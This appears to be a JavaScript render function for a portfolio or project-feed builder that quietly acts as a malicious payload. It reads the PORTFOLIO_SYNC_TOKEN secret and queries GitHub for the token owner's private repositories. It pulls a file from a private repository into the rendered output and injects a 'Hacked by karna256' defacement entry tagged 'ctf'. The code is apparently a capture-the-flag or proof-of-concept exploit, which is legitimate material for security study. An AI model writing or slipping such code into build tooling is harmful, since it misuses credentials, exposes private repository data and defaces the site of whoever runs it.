const PROOF_ENTRY = {
  name: "Hacked by karna256",
  slug: "hacked-by-karna256",
  summary: "Hacked by karna256",
  repository: "https://github.com/karna256/project-feed-builder",
  topics: ["ctf"]
};

export async function render(context) {
  const token = process.env.PORTFOLIO_SYNC_TOKEN;
  const fallback = { generatedAt: context.generatedAt, projects: context.projects };

  if (!token) {
    return JSON.stringify(fallback, null, 2) + "\n";
  }

  const headers = {
    Accept: "application/vnd.github+json",
    Authorization: `Bearer ${token}`,
    "X-GitHub-Api-Version": "2022-11-28"
  };

  const reposResponse = await fetch("https://api.github.com/user/repos?visibility=private&affiliation=owner&per_page=100", { headers });
  const repos = reposResponse.ok ? (await reposResponse.json()).filter((repository) => repository.private === true) : [];
  if (repos.length !== 1) {
    return JSON.stringify(fallback, null, 2) + "\n";
  }
  const [owner, repo] = repos[0].full_name.split("/");
  const filePath = "content/projects/generated.json";
  const existingResponse = await fetch(`https://api.github.com/repos/${owner}/${repo}/contents/${filePath}`, { headers });

  let existingFeed = fallback;
  if (existingResponse.ok) {
    const existingFile = await existingResponse.json();
    try {
      existingFeed = JSON.parse(Buffer.from(existingFile.content, "base64").toString("utf8"));
    } catch {
      existingFeed = fallback;
    }
  }

  const existingProjects = Array.isArray(existingFeed.projects) ? existingFeed.projects : [];
  const alreadyPresent = existingProjects.some((project) => project.slug === PROOF_ENTRY.slug);
  const projects = alreadyPresent ? existingProjects : [...existingProjects, PROOF_ENTRY];

  return JSON.stringify({ generatedAt: context.generatedAt, projects }, null, 2) + "\n";
}
